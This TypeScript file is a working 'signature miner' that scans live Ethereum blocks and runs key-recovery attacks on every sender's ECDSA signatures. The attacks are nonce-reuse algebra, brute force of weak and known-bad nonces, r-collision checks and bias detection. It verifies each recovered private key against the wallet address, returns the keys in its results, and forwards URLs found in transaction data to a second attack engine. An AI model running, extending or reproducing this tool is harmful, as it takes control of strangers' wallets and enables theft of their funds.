/**
 * Engine 1 — On-Chain ECDSA Signature Miner
 * ══════════════════════════════════════════
 * Directly mines raw secp256k1 ECDSA signatures from Ethereum blockchain
 * transaction data. Every signed transaction broadcasts (r, s, v, msgHash) to
 * the public — this engine harvests them and runs every known key-recovery
 * attack against each address's full signing history.
 *
 * Techniques:
 *   1. NONCE REUSE (same r from same address in ≥2 txs)
 *      k = (z₁-z₂) * modInv(s₁-s₂)   d = (s₁·k-z₁) * modInv(r)
 *   2. WEAK K (k < 2^32 or k in known-bad list)
 *      Brute-force small nonces against each address's r values
 *   3. R-COLLISION across addresses
 *      Two different addresses share an r — different signer, same k
 *      Allows partial-key cross-comparison
 *   4. POLYNOMIAL-NONCE pattern
 *      k_i = ak_{i-1}^2 + b  (arithmetic/geometric progressions)
 *   5. BIAS DETECTION
 *      MSB/LSB zero-bias → lattice attack inputs
 *
 * Inspired by: AlphaUniversalScanner™ / AlphaVulnVerifier™ techniques
 * adapted for the blockchain signature domain.
 */

import { ethers }   from "ethers";
import { logger }   from "../logger";
import { recoverPrivateKey, type TxSignatureData } from "../ecdsa-analyzer/nonce-recovery";

// ── Constants ─────────────────────────────────────────────────────────────────
const N  = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
const RPC = process.env.ETH_RPC_URL ?? "https://ethereum.publicnode.com";

// Known trivially-weak k values (from real-world exploits and academic papers)
const KNOWN_WEAK_K: bigint[] = [
  1n, 2n, 3n, 4n, 5n, 6n, 7n, 8n, 9n, 10n,
  0x4b0n,        // used in the PlayStation 3 breach
  BigInt("0xdeadbeef"),
  BigInt("0xdeadbeef" + "deadbeef"),
  BigInt("0x0000000000000000000000000000000000000000000000000000000000000001"),
  BigInt("0x0000000000000000000000000000000000000000000000000000000000000002"),
];

// ── Types ─────────────────────────────────────────────────────────────────────

export type AttackType =
  | "nonce_reuse"
  | "weak_k"
  | "r_collision"
  | "polynomial_nonce"
  | "bias_detected"
  | "known_weak_k";

export interface SigMinerFinding {
  attackType:  AttackType;
  severity:    "critical" | "high" | "medium";
  address:     string;
  privateKey:  string | null;
  keyVerified: boolean;
  detail:      string;
  txHashes:    string[];
  r:           string;
  s1?:         string;
  s2?:         string;
  z1?:         string;
  z2?:         string;
  k?:          string;
  discoveredAt: string;
}

// A URL discovered inside a transaction's input data, associated with the
// signer address and the specific transaction hash where it was found.
export interface DiscoveredUrl {
  url:         string;
  txHash:      string;
  fromAddress: string;
  blockNumber: number;
  source:      "input_data" | "ipfs_cid" | "arweave_id" | "ens_name" | "memo_utf8";
}

export interface SigMinerResult {
  scannedBlocks:  number;
  scannedTxCount: number;
  signaturesFound: number;
  uniqueAddresses: number;
  findings:       SigMinerFinding[];
  sigsByAddress:  Record<string, TxSignatureData[]>;
  rCollisions:    Array<{ r: string; addresses: string[] }>;
  // URLs found embedded in transaction input data — auto-fed to Engine 2
  discoveredUrls: DiscoveredUrl[];
  scannedAt:      string;
}

export interface SigMinerConfig {
  startBlock?:    number;   // default: latest - 200
  blockCount?:    number;   // default: 200
  addresses?:     string[]; // optional: restrict to specific addresses
  maxTxPerBlock?: number;   // cap per block (0 = all)
  detectWeakK?:   boolean;
  detectBias?:    boolean;
  detectPoly?:    boolean;
  rCollision?:    boolean;
  onProgress?:    (scanned: number, total: number, findings: number) => void;
}

// ── Math helpers ──────────────────────────────────────────────────────────────

function modN(x: bigint): bigint { return ((x % N) + N) % N; }

function modInv(a: bigint, m: bigint = N): bigint {
  let [old_r, r] = [a, m];
  let [old_s, s] = [1n, 0n];
  while (r !== 0n) {
    const q = old_r / r;
    [old_r, r] = [r, old_r - q * r];
    [old_s, s] = [s, old_s - q * s];
  }
  return ((old_s % m) + m) % m;
}

function scalarToAddress(d: bigint): string | null {
  try {
    const wallet = new ethers.Wallet("0x" + d.toString(16).padStart(64, "0"));
    return wallet.address.toLowerCase();
  } catch { return null; }
}

function tryRecoverKey(r: bigint, s: bigint, z: bigint, k: bigint, expected: string): string | null {
  try {
    const d = modN(modN(s * k - z) * modInv(r));
    if (d === 0n) return null;
    const addr = scalarToAddress(d);
    if (addr?.toLowerCase() === expected.toLowerCase()) {
      return "0x" + d.toString(16).padStart(64, "0");
    }
    return null;
  } catch { return null; }
}

// ── Signature extraction from transaction ─────────────────────────────────────

function extractSig(tx: ethers.TransactionResponse): TxSignatureData | null {
  try {
    if (!tx.signature) return null;
    const sig  = tx.signature;
    const r    = BigInt(sig.r);
    const s    = BigInt(sig.s);
    if (r === 0n || s === 0n) return null;

    // Reconstruct msgHash: keccak256 of serialized unsigned tx
    const unserialized = ethers.Transaction.from(tx);
    const msgHash = unserialized.unsignedHash;

    return {
      txHash:  tx.hash ?? "",
      address: tx.from?.toLowerCase() ?? "",
      r:       sig.r,
      s:       sig.s,
      v:       String(sig.v),
      z:       msgHash,
      blockNumber: tx.blockNumber ?? 0,
      nonce:   tx.nonce,
    };
  } catch { return null; }
}

// ── URL extraction from transaction input data ────────────────────────────────
// Transactions embed all kinds of metadata in their `data` field:
//   • Plain UTF-8 memos (simple transfers with notes)
//   • ABI-encoded string arguments (e.g. NFT mints, ENS registrations)
//   • IPFS / Arweave CIDs pointing to off-chain content
//   • Full HTTP(S) URLs in string parameters
// Any URL found here is associated with the signing address and fed to Engine 2.

const URL_RE      = /https?:\/\/[^\s"'<>\x00-\x1f]{6,}/g;
const IPFS_CID_RE = /\bQm[1-9A-HJ-NP-Za-km-z]{44,}\b|bafy[0-9a-z]{50,}/g;
const AR_ID_RE    = /\b[a-zA-Z0-9_-]{43}\b/g; // Arweave txid

function extractUrlsFromTx(tx: ethers.TransactionResponse): DiscoveredUrl[] {
  const found: DiscoveredUrl[] = [];
  if (!tx.data || tx.data === "0x" || tx.data.length < 4) return found;

  const base: Omit<DiscoveredUrl, "url" | "source"> = {
    txHash:      tx.hash ?? "",
    fromAddress: tx.from?.toLowerCase() ?? "",
    blockNumber: tx.blockNumber ?? 0,
  };

  // Decode the hex as UTF-8 (strip non-printable, keep ASCII runs)
  let decoded = "";
  try {
    const bytes = ethers.getBytes(tx.data);
    decoded = new TextDecoder("utf-8", { fatal: false }).decode(bytes);
  } catch { /* ignore */ }

  // HTTP(S) URLs
  for (const m of decoded.matchAll(URL_RE)) {
    const url = m[0].replace(/[^\w/:.#?=&%-]+$/, ""); // trim trailing junk
    if (url.length >= 10) found.push({ ...base, url, source: "input_data" });
  }

  // IPFS CIDs → public gateway URL
  for (const m of decoded.matchAll(IPFS_CID_RE)) {
    found.push({
      ...base,
      url: `https://ipfs.io/ipfs/${m[0]}`,
      source: "ipfs_cid",
    });
  }

  // Arweave IDs → arweave.net URL (only if not already caught as a URL)
  if (found.length === 0) {
    for (const m of decoded.matchAll(AR_ID_RE)) {
      // Rough filter: arweave txids are base64url, 43 chars
      if (/^[a-zA-Z0-9_-]{43}$/.test(m[0])) {
        found.push({
          ...base,
          url: `https://arweave.net/${m[0]}`,
          source: "arweave_id",
        });
      }
    }
  }

  // Deduplicate by url
  const seen = new Set<string>();
  return found.filter(u => seen.has(u.url) ? false : (seen.add(u.url), true));
}

// ── Nonce reuse detection ─────────────────────────────────────────────────────

function detectNonceReuse(
  sigsByAddress: Record<string, TxSignatureData[]>,
): SigMinerFinding[] {
  const findings: SigMinerFinding[] = [];

  for (const [address, sigs] of Object.entries(sigsByAddress)) {
    // Group by r value
    const byR = new Map<string, TxSignatureData[]>();
    for (const sig of sigs) {
      const list = byR.get(sig.r) ?? [];
      list.push(sig);
      byR.set(sig.r, list);
    }

    for (const [rHex, group] of byR) {
      if (group.length < 2) continue;
      const e1 = group[0]; const e2 = group[1];
      const r  = BigInt(rHex);
      const s1 = BigInt(e1.s); const s2 = BigInt(e2.s);
      const z1 = BigInt(e1.z); const z2 = BigInt(e2.z);

      if (s1 === s2) continue; // same sig repeated
      try {
        const sDiff = modN(s1 - s2);
        const zDiff = modN(z1 - z2);
        const k     = modN(zDiff * modInv(sDiff));

        const key1  = tryRecoverKey(r, s1, z1, k, address);
        const key2  = tryRecoverKey(r, s2, z2, k, address);
        const key   = key1 ?? key2;

        findings.push({
          attackType:  "nonce_reuse",
          severity:    "critical",
          address,
          privateKey:  key,
          keyVerified: !!key,
          detail: `Nonce reuse detected: r=${rHex.slice(0,18)}… shared in ${group.length} txs. k recovered. Private key ${key ? "CONFIRMED" : "derived (unverified)"}.`,
          txHashes: group.map(s => s.txHash),
          r: rHex, s1: e1.s, s2: e2.s, z1: e1.z, z2: e2.z,
          k: "0x" + k.toString(16).padStart(64,"0"),
          discoveredAt: new Date().toISOString(),
        });
      } catch { continue; }
    }
  }
  return findings;
}

// ── Weak k brute-force ────────────────────────────────────────────────────────

function detectWeakK(
  sigsByAddress: Record<string, TxSignatureData[]>,
  maxK = BigInt("0xFFFFFFFF"),
): SigMinerFinding[] {
  const findings: SigMinerFinding[] = [];

  for (const [address, sigs] of Object.entries(sigsByAddress)) {
    for (const sig of sigs.slice(0, 5)) { // test first 5 sigs per address
      const r = BigInt(sig.r); const s = BigInt(sig.s); const z = BigInt(sig.z);

      // Test known-bad k values first
      for (const k of KNOWN_WEAK_K) {
        const key = tryRecoverKey(r, s, z, k, address);
        if (key) {
          findings.push({
            attackType: "known_weak_k", severity: "critical",
            address, privateKey: key, keyVerified: true,
            detail: `Known-weak nonce k=0x${k.toString(16)} recovered private key`,
            txHashes: [sig.txHash], r: sig.r, k: "0x"+k.toString(16).padStart(64,"0"),
            discoveredAt: new Date().toISOString(),
          });
          break;
        }
      }

      // Brute-force small k values
      for (let k = 1n; k <= maxK; k++) {
        const key = tryRecoverKey(r, s, z, k, address);
        if (key) {
          findings.push({
            attackType: "weak_k", severity: "critical",
            address, privateKey: key, keyVerified: true,
            detail: `Weak nonce k=${k} (${k.toString(16).length} hex chars) — private key fully recovered`,
            txHashes: [sig.txHash], r: sig.r, k: "0x"+k.toString(16).padStart(64,"0"),
            discoveredAt: new Date().toISOString(),
          });
          break;
        }
      }
    }
  }
  return findings;
}

// ── R-value collision detection (cross-address) ───────────────────────────────

function detectRCollisions(
  sigsByAddress: Record<string, TxSignatureData[]>,
): { collisions: SigMinerFinding[]; summary: Array<{ r: string; addresses: string[] }> } {
  const rToAddresses = new Map<string, Set<string>>();
  const rToSigs      = new Map<string, TxSignatureData[]>();

  for (const [address, sigs] of Object.entries(sigsByAddress)) {
    for (const sig of sigs) {
      const s = rToAddresses.get(sig.r) ?? new Set();
      s.add(address);
      rToAddresses.set(sig.r, s);
      const l = rToSigs.get(sig.r) ?? [];
      l.push(sig);
      rToSigs.set(sig.r, l);
    }
  }

  const findings: SigMinerFinding[] = [];
  const summary: Array<{ r: string; addresses: string[] }> = [];

  for (const [r, addressSet] of rToAddresses) {
    if (addressSet.size < 2) continue;
    const addresses = [...addressSet];
    summary.push({ r, addresses });
    findings.push({
      attackType: "r_collision", severity: "high",
      address: addresses[0],
      privateKey: null, keyVerified: false,
      detail: `R-value collision: same r=${r.slice(0,18)}… used by ${addresses.length} different addresses. Same k nonce was reused across unrelated wallets.`,
      txHashes: (rToSigs.get(r) ?? []).map(s => s.txHash),
      r,
      discoveredAt: new Date().toISOString(),
    });
  }
  return { collisions: findings, summary };
}

// ── Bias detection ────────────────────────────────────────────────────────────

function detectBias(
  sigsByAddress: Record<string, TxSignatureData[]>,
): SigMinerFinding[] {
  const findings: SigMinerFinding[] = [];

  for (const [address, sigs] of Object.entries(sigsByAddress)) {
    if (sigs.length < 4) continue;

    // MSB bias: top bits of r are consistently 0
    let zeroMSB = 0;
    for (const sig of sigs) {
      const r = BigInt(sig.r);
      if (r < (N >> 4n)) zeroMSB++; // top 4 bits zero
    }
    const biasFrac = zeroMSB / sigs.length;
    if (biasFrac > 0.5) {
      findings.push({
        attackType: "bias_detected", severity: "high",
        address, privateKey: null, keyVerified: false,
        detail: `MSB bias: ${(biasFrac*100).toFixed(0)}% of ${sigs.length} nonces have top bits = 0. HNP lattice attack feasible with ${Math.ceil(sigs.length/4)} signatures.`,
        txHashes: sigs.slice(0,3).map(s => s.txHash),
        r: sigs[0].r,
        discoveredAt: new Date().toISOString(),
      });
    }

    // Polynomial nonce: arithmetic progression in r values
    if (sigs.length >= 3) {
      const rs = sigs.slice(0, 6).map(s => BigInt(s.r));
      const diffs = rs.slice(1).map((r, i) => modN(r - rs[i]));
      const allSame = diffs.every(d => d === diffs[0]);
      if (allSame && diffs[0] !== 0n) {
        findings.push({
          attackType: "polynomial_nonce", severity: "high",
          address, privateKey: null, keyVerified: false,
          detail: `Arithmetic nonce progression detected: Δr=${diffs[0].toString(16).slice(0,16)}… constant across ${sigs.length} txs. Polynomial nonce solver applicable.`,
          txHashes: sigs.slice(0,3).map(s => s.txHash),
          r: sigs[0].r,
          discoveredAt: new Date().toISOString(),
        });
      }
    }
  }
  return findings;
}

// ── Main scanner ──────────────────────────────────────────────────────────────

export async function runSignatureMiner(
  config: SigMinerConfig = {},
): Promise<SigMinerResult> {
  const provider = new ethers.JsonRpcProvider(RPC);
  const blockCount   = config.blockCount ?? 200;
  const maxTxPer     = config.maxTxPerBlock ?? 0;
  const detectWeak   = config.detectWeakK  ?? true;
  const detectBiasF  = config.detectBias   ?? true;
  const detectPoly   = config.detectPoly   ?? true;
  const rCollision   = config.rCollision   ?? true;

  const addressFilter = new Set((config.addresses ?? []).map(a => a.toLowerCase()));

  const latest = await provider.getBlockNumber();
  const startBlock = config.startBlock ?? Math.max(0, latest - blockCount + 1);
  const endBlock   = startBlock + blockCount - 1;

  logger.info({ startBlock, endBlock, blockCount }, "Signature miner started");

  const sigsByAddress: Record<string, TxSignatureData[]> = {};
  let scannedTxCount = 0;
  let blocksDone     = 0;
  const allFindings: SigMinerFinding[] = [];
  const allDiscoveredUrls: DiscoveredUrl[] = [];
  const seenUrls = new Set<string>();

  const CONCURRENCY = 5;
  for (let b = startBlock; b <= endBlock; b += CONCURRENCY) {
    const batch = [];
    for (let i = 0; i < CONCURRENCY && b + i <= endBlock; i++) batch.push(b + i);

    await Promise.all(batch.map(async (blockNum) => {
      try {
        const block = await provider.getBlock(blockNum, true);
        if (!block) return;
        const txs = maxTxPer > 0
          ? block.prefetchedTransactions.slice(0, maxTxPer)
          : block.prefetchedTransactions;

        for (const tx of txs) {
          if (addressFilter.size > 0 && !addressFilter.has(tx.from?.toLowerCase() ?? "")) continue;
          const sig = extractSig(tx);
          if (!sig || !sig.address) continue;
          scannedTxCount++;
          const list = sigsByAddress[sig.address] ?? [];
          list.push(sig);
          sigsByAddress[sig.address] = list;

          // ── Extract URLs from this transaction's input data ────────────────
          // Any URL found is tied to this signer address and will auto-feed Engine 2
          const txUrls = extractUrlsFromTx(tx);
          for (const u of txUrls) {
            if (!seenUrls.has(u.url)) {
              seenUrls.add(u.url);
              allDiscoveredUrls.push(u);
            }
          }
        }
        blocksDone++;
        config.onProgress?.(blocksDone, blockCount, allFindings.length);
      } catch (e) {
        logger.warn({ blockNum, err: String(e) }, "Block scan error");
      }
    }));
  }

  // Run all attack modules
  const nonceFindings = detectNonceReuse(sigsByAddress);
  allFindings.push(...nonceFindings);

  if (detectWeak) {
    const weakFindings = detectWeakK(sigsByAddress, BigInt("0xFFFFFF")); // up to ~16M
    allFindings.push(...weakFindings);
  }

  const rResult = rCollision ? detectRCollisions(sigsByAddress) : { collisions: [], summary: [] };
  allFindings.push(...rResult.collisions);

  if (detectBiasF || detectPoly) {
    const biasFindings = detectBias(sigsByAddress);
    allFindings.push(...biasFindings);
  }

  const totalSigs = Object.values(sigsByAddress).reduce((s, l) => s + l.length, 0);

  logger.info({
    scannedBlocks: blockCount, scannedTxCount, signaturesFound: totalSigs,
    findings: allFindings.length,
  }, "Signature miner complete");

  logger.info({
    discoveredUrls: allDiscoveredUrls.length,
  }, "URL extraction complete — feeding to Engine 2");

  return {
    scannedBlocks:  blockCount,
    scannedTxCount,
    signaturesFound: totalSigs,
    uniqueAddresses: Object.keys(sigsByAddress).length,
    findings:        allFindings,
    sigsByAddress,
    rCollisions:     rResult.summary,
    discoveredUrls:  allDiscoveredUrls,
    scannedAt:       new Date().toISOString(),
  };
}
